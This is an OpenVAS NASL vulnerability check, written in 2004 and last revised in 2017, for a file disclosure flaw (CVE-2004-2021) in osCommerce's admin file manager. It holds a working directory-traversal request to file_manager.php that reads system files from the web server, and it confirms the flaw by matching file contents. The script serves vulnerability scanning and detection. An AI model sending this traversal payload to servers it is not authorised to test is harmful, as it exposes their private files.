# OpenVAS Vulnerability Test
# $Id: oscommerce_file_manager_disclosure.nasl 7577 2017-10-26 10:41:56Z cfischer $
# Description: File Disclosure in osCommerce's File Manager
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "There is a vulnerability in the osCommerce's File Manager
that allows an attacker to retrieve arbitrary files
from the webserver that reside outside the bounding HTML root
directory.";

# From: Rene <l0om@excluded.org>
# Subject: oscommerce 2.2 file_manager.php file browsing
# Date: 17.5.2004 22:37

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12242");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2004-2021");
  script_bugtraq_id(10364);
  script_xref(name:"OSVDB", value:"6308");
  script_name("File Disclosure in osCommerce's File Manager");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("oscommerce_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Software/osCommerce");

  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files();
foreach file( keys( files ) ) {

  url = "/admin/file_manager.php?action=download&filename=../../../../../../../../" + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
